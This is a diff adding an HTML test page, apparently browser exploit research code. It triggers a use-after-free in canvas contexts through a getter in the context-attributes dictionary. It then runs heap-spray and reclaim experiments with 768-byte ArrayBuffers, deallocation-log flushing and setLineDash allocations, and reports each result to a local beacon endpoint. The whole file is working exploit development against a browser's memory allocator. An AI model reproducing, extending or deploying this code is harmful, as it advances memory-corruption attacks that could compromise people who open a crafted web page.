@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V543b</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V543-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      innerCtx.lineWidth=11111.11111;
+      innerCtx.globalAlpha=0.777;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+beacon('BOOT','V543b-safe-oracle');
+
+// ===== T1: Bare read — getContextAttributes on naked freed slot =====
+(function T1(){
+  beacon('T1-START','bare freed context, getContextAttributes oracle');
+  var ctx=triggerUAF();
+  if(!ctx){beacon('T1-FAIL','no ctx');return}
+  beacon('T1-UAF','ok');
+  try{
+    var a=ctx.getContextAttributes();
+    beacon('T1-ATTRS','desync='+a.desynchronized+',alpha='+a.alpha+',cs='+a.colorSpace);
+  }catch(e){beacon('T1-ATTRS-ERR',e.message)}
+})();
+
+// ===== T2: AB(768) spray WITHOUT dealloc flush =====
+(function T2(){
+  beacon('T2-START','AB(768) x300, no flush');
+  var ctx=triggerUAF();
+  if(!ctx){beacon('T2-FAIL','no ctx');return}
+  beacon('T2-UAF','ok');
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var u8=new Uint8Array(ab);
+    for(var k=0;k<768;k++)u8[k]=0x42;
+    var dv=new DataView(ab);
+    dv.setUint32(0,0xAB000000|i,true);
+    abs.push({ab:ab,u8:u8,dv:dv});
+  }
+  beacon('T2-SPRAYED','300');
+
+  try{
+    var a=ctx.getContextAttributes();
+    beacon('T2-ATTRS','desync='+a.desynchronized+',alpha='+a.alpha+',cs='+a.colorSpace);
+    if(a.desynchronized!==false)beacon('T2-RECLAIM','*** desync changed! ***');
+  }catch(e){beacon('T2-ATTRS-ERR',e.message)}
+
+  // save() test
+  try{
+    var snaps=[];
+    for(var i=0;i<abs.length;i++)snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+    for(var s=0;s<5;s++)ctx.save();
+    for(var i=0;i<abs.length;i++){
+      for(var j=0;j<768;j++){
+        if(abs[i].u8[j]!==snaps[i][j]){
+          var diffs=[];
+          for(var jj=j;jj<Math.min(j+80,768);jj++){
+            if(abs[i].u8[jj]!==snaps[i][jj])diffs.push(jj+':'+snaps[i][jj]+'->'+abs[i].u8[jj]);
+            if(diffs.length>=8)break;
+          }
+          beacon('T2-SAVE-HIT','AB['+i+'] '+diffs.join(','));
+          break;
+        }
+      }
+    }
+    beacon('T2-SAVE','done');
+  }catch(e){beacon('T2-SAVE-ERR',e.message)}
+})();
+
+// ===== T3: AB(768) spray WITH dealloc flush (600 context churn) =====
+(function T3(){
+  beacon('T3-START','AB(768) x300 WITH 600-context dealloc flush');
+  var ctx=triggerUAF();
+  if(!ctx){beacon('T3-FAIL','no ctx');return}
+  beacon('T3-UAF','ok');
+
+  // Flush bmalloc deallocation log: create+free 600 contexts (768B each)
+  for(var i=0;i<600;i++){
+    var fc=document.createElement('canvas');fc.width=1;fc.height=1;
+    fc.getContext('2d');
+    try{fc.getContext('bitmaprenderer')}catch(e){}
+  }
+  beacon('T3-FLUSHED','600 contexts churned');
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var u8=new Uint8Array(ab);
+    for(var k=0;k<768;k++)u8[k]=0x42;
+    var dv=new DataView(ab);
+    dv.setUint32(0,0xAB000000|i,true);
+    abs.push({ab:ab,u8:u8,dv:dv});
+  }
+  beacon('T3-SPRAYED','300');
+
+  try{
+    var a=ctx.getContextAttributes();
+    beacon('T3-ATTRS','desync='+a.desynchronized+',alpha='+a.alpha+',cs='+a.colorSpace);
+    if(a.desynchronized!==false)beacon('T3-RECLAIM','*** desync changed! ***');
+  }catch(e){beacon('T3-ATTRS-ERR',e.message)}
+
+  // save() test
+  try{
+    var snaps=[];
+    for(var i=0;i<abs.length;i++)snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+    for(var s=0;s<5;s++)ctx.save();
+    for(var i=0;i<abs.length;i++){
+      for(var j=0;j<768;j++){
+        if(abs[i].u8[j]!==snaps[i][j]){
+          var diffs=[];
+          for(var jj=j;jj<Math.min(j+80,768);jj++){
+            if(abs[i].u8[jj]!==snaps[i][jj])diffs.push(jj+':'+snaps[i][jj]+'->'+abs[i].u8[jj]);
+            if(diffs.length>=8)break;
+          }
+          beacon('T3-SAVE-HIT','AB['+i+'] '+diffs.join(','));
+          break;
+        }
+      }
+    }
+    beacon('T3-SAVE','done');
+  }catch(e){beacon('T3-SAVE-ERR',e.message)}
+})();
+
+// ===== T4: AB(768) spray WITH dealloc flush + alloc-free cycle =====
+(function T4(){
+  beacon('T4-START','AB(768) x500 WITH flush + alloc-free cycle');
+  var ctx=triggerUAF();
+  if(!ctx){beacon('T4-FAIL','no ctx');return}
+  beacon('T4-UAF','ok');
+
+  // Flush: 600 same-size allocs via setLineDash (96 doubles = 768B)
+  var flushCtxs=[];
+  for(var i=0;i<600;i++){
+    var fc=document.createElement('canvas');fc.width=1;fc.height=1;
+    var fctx=fc.getContext('2d');
+    fctx.setLineDash(new Array(96).fill(1.0));
+    flushCtxs.push(fctx);
+  }
+  // Free the dash arrays (768B each goes to free list)
+  for(var i=0;i<600;i++)flushCtxs[i].setLineDash([]);
+  beacon('T4-FLUSHED','600 dash arrays churned');
+
+  // Now spray AB(768) — 500 to maximize chances
+  var abs=[];
+  for(var i=0;i<500;i++){
+    var ab=new ArrayBuffer(768);
+    var u8=new Uint8Array(ab);
+    for(var k=0;k<768;k++)u8[k]=0x42;
+    var dv=new DataView(ab);
+    dv.setUint32(0,0xAB000000|i,true);
+    abs.push({ab:ab,u8:u8,dv:dv});
+  }
+  beacon('T4-SPRAYED','500');
+
+  try{
+    var a=ctx.getContextAttributes();
+    beacon('T4-ATTRS','desync='+a.desynchronized+',alpha='+a.alpha+',cs='+a.colorSpace);
+    if(a.desynchronized!==false)beacon('T4-RECLAIM','*** desync changed! ***');
+  }catch(e){beacon('T4-ATTRS-ERR',e.message)}
+
+  // save() test
+  try{
+    var snaps=[];
+    for(var i=0;i<abs.length;i++)snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+    for(var s=0;s<5;s++)ctx.save();
+    for(var i=0;i<abs.length;i++){
+      for(var j=0;j<768;j++){
+        if(abs[i].u8[j]!==snaps[i][j]){
+          var diffs=[];
+          for(var jj=j;jj<Math.min(j+80,768);jj++){
+            if(abs[i].u8[jj]!==snaps[i][jj])diffs.push(jj+':'+snaps[i][jj]+'->'+abs[i].u8[jj]);
+            if(diffs.length>=8)break;
+          }
+          beacon('T4-SAVE-HIT','AB['+i+'] '+diffs.join(','));
+          break;
+        }
+      }
+    }
+    beacon('T4-SAVE','done');
+  }catch(e){beacon('T4-SAVE-ERR',e.message)}
+})();
+
+// ===== T5: Same-type reclaim (control — known working) =====
+(function T5(){
+  beacon('T5-START','same-type reclaim control');
+  var ctx=triggerUAF();
+  if(!ctx){beacon('T5-FAIL','no ctx');return}
+  beacon('T5-UAF','ok');
+
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  beacon('T5-SPRAYED','200 contexts');
+
+  try{
+    var a=ctx.getContextAttributes();
+    beacon('T5-ATTRS','desync='+a.desynchronized+',alpha='+a.alpha+',cs='+a.colorSpace);
+  }catch(e){beacon('T5-ATTRS-ERR',e.message)}
+
+  try{
+    var lw=ctx.lineWidth;
+    beacon('T5-LW','val='+lw+',expected=11111.11111 or 1 (reclaimed)');
+  }catch(e){beacon('T5-LW-ERR',e.message)}
+})();
+
+beacon('DONE','V543b-all-tests-complete');
+</script>
+</body></html>
